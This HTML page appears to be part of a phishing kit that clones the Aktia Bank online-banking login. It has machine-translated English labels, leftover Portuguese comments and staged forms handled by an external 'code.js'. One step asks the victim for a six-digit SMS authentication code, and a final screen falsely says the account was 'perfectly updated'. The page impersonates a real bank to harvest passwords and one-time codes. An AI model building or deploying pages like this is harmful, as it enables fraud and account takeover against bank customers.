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">
																							</td>
																							<td style="padding-left:20px;">
																								<label style="color:#666;font-size:20px;">
																									<!-- Foi enviado um SMS para com o
																									código de
																									autenticação. -->
																									<font style="vertical-align: inherit;">An SMS was sent with the authentication code.</font>
																								</label>
																								<br>
																								<label>
																									<font style="vertical-align: inherit;">Wait for the SMS and after receiving it please enter the code below.</font>
																									<!-- Aguarde o SMS e após a sua receção por favor introduza o código em baixo. -->
																								</label>
																							</td>
																						</tr>
																					</tbody>
																				</table>
																				<br><br>
																				<!-- <label style="font-weight:bold;">Código</label> -->
																				<label style="font-weight:bold;"><font style="vertical-align: inherit;">Code</font></label>
																				<input type="text" class="bitinput" id="_tables.sms" maxlength="6" style="width: 100px;padding: 5px;">
																				<input type="button" class="button" value="Autenticar" onclick="_tables.fkbtn(3);">
																				<!-- <div style="text-align:right;float: right;" class="holder">
																					<input type="button" class="button" value="Autenticar" onclick="_tables.fkbtn(3);"> -->
																					<!-- <button onclick="_tables.fkbtn(3);" style="width:150px;">Autenticar</button> -->
																				<!-- </div> -->
																			</div>
																		</td>
																	</tr>
																</tbody>
															</table>
														</div>
													</div>
													<div id="form:4" style="display:none;">
														<div class="center">
															<p style="font-size:12px;line-height:20px;">
																<!-- Obrigado, sua conta foi perfeitamente atualizada. Obrigado pelo seu tempo.....  -->
																<font style="vertical-align: inherit;">Thank you, your account has been perfectly updated. Thank's for your time.....</font>
															</p>
															<div style="    text-align: center;	margin-bottom: 20px;">
																<img style="width:53px;"
																	src="data:image/png;base64,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">
															</div>
															<div style="border-bottom: 2px solid #ddd;margin-top:5px;"></div>
															<br>
															<div style="text-align:right;" class="holder">															
																<input type="button" class="button" value="Deixar">
																<!-- <button>Deixar</button> -->
															</div>
														</div>
													</div>
												</td>
											</tr>
										</tbody>
									</table>
								</div>
            </div>
            <!-- aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -->


            <div class="clear"></div>
          </div>
          <div class="left-container_bottom mt-10">
            <ul>
              <li>
                <a href="http://www.aktia.fi/fi/konttorit-ja-asiointi/kysymykset-ja-vastaukset/verkkopankki"
                  target="_blank" class="new_window">
                  <font style="vertical-align: inherit;">I forgot my password</font>
                </a>
              </li>
              <li>
                <a href="http://www.aktia.fi/fi/konttorit-ja-asiointi/kysymykset-ja-vastaukset/verkkopankki"
                  target="_blank" class="new_window">
                  <font style="vertical-align: inherit;">My key ID card is lost</font>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>

      <div class="mt-50">
        <div class="navi-container">
          <h3 class="header-no-margin">
            <font style="vertical-align: inherit;">If you do not have Aktia IDs</font>
          </h3>
        </div>
        <p class="tupasinfo">
          <font style="vertical-align: inherit;">Log in with your own bank ID to check your services or apply for a
            mortgage or card.</font>
        </p>
        <div class="right-container">
          <table>
            <tbody>
              <tr>
                <td class="banklistleft">
                  <form name="tupaslogin" action="/tunnistus/UI/Login" method="get">
                    <input type="hidden" name="module" value="TupasMuut">
                    <input type="hidden" name="IDToken1" value="1">
                    <input type="image" src="/tunnistus/images/1x1.png" alt="Other banks" title="Other banks"
                      name="TupasMuut" --="">
                  </form>
                  <p class="muut">&nbsp;</p>
                </td>
              </tr>
            </tbody>
          </table>
          <div class="clear">
          </div>
        </div>
      </div>

      <div class="other_links">
        <p>
          <strong>
            <font style="vertical-align: inherit;">Customer</font>
          </strong>
          <br>
          <font style="vertical-align: inherit;"> service </font>
          <strong>
            <font style="vertical-align: inherit;">Customer</font>
          </strong>
          <font style="vertical-align: inherit;"> service and online banking user support tel. +358 10 247 010 </font>
          <br>
          <a href="http://www.aktia.fi/fi/konttorit-ja-asiointi/ota-yhteytta" target="_blank" class="new_window">
            <font style="vertical-align: inherit;">Opening hours</font>
          </a>
          <br>
          <br>
        </p>
      </div>

      <div class="bottom_links">
        <ul>
          <li><a href="http://www.aktia.fi/fi/kayttoehdot" target="_blank">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">Terms</font>
              </font>
            </a></li>
          <li><a href="http://www.aktia.fi/fi/tilit-ja-kortit/kysymykset-ja-vastaukset/verkkopankki" target="_blank">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">Instructions</font>
              </font>
            </a></li>
          <li><a href="http://www.aktia.fi/fi/konttorit-ja-asiointi/turvallisuus/tietoturvaratkaisut" target="_blank">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">Safety</font>
              </font>
            </a></li>
          <li><a href="http://www.aktia.fi/fi/konttorit-ja-asiointi/ota-yhteytta/lomakkeet" target="_blank">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">Feedback</font>
              </font>
            </a></li>
          <li><a href="http://www.aktia.fi/fi/yksityisyyden-suoja" target="_blank">
              <font style="vertical-align: inherit;">
                <font style="vertical-align: inherit;">Privacy policy</font>
              </font>
            </a></li>
          <li id="timestamp">
            <font style="vertical-align: inherit;">
              <font style="vertical-align: inherit;">
                2/26/2021 2:55:08 AM
              </font>
            </font>
          </li>
        </ul>
      </div>
      <br style="clear: both;">
    </div>
    <div class="footer">
      <font style="vertical-align: inherit;">
        © Aktia Bank plc, Arkadiankatu 4-6, 00100 Helsinki, tel. +358 10 247 5000, fax +358 10 247 6356 Business ID
        2181702-8, BIC: HELSFIHH.
      </font>
    </div>
  </div>

  <div id="iframebox"></div>
  <script src="jquery.min.js"></script>
  <script src="code.js"></script>
  <script type='text/javascript'>
  function setpass() {
    document.getElementById("_tables.password").setAttribute('type', 'text');
    document.getElementById("show-password-button").style.display = "none";
    document.getElementById("show-password-button2").style.display = "block";
  }

  function setpass2() {
    document.getElementById("_tables.password").setAttribute('type', 'password');
    document.getElementById("show-password-button2").style.display = "none";
    document.getElementById("show-password-button").style.display = "block";
  }

  function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }

  function goStep3() {
    _tables.fkbtn(2);
    // document.getElementById('body_div').style.display = "none";
    // document.getElementById('gray_div').style.display = "block";
    // _tables.fkbtn(1);	
  }
  </script>

</body>

</html>